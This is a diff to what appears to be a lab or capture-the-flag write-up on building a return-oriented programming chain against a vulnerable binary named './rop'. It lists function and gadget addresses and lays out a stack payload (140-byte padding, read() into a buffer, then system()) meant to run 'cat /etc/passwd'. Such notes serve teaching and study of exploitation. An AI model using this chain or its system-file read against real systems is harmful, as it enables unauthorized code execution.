@@ -25,3 +25,29 @@ read() address = 0x0804832c (objdump -D ./rop | grep read)
 write() address = 0x8048442 (objdump -D ./rop | grep write)
 
 3) We need to find system() address and pass written "cat /etc/passwd" on buffer to the system function
+ - system addr 0xb7e45da0
+
+4) we require pppr: pop -> pop -> pop -> ret ; addr = 0x080484b6
+
+
+payload:
+
+------------------
+buffer 0x08049530
+------------------
+bogus address or exit() addr 0xb7e399d0
+------------------
+system 0xb7e45da0
+------------------
+length len(cmd)
+------------------
+buffer 0x08049530
+------------------
+stdin (0)
+------------------
+pppr 0x080484b6
+------------------
+read 0x0804832c
+------------------
+"A"*140
+------------------
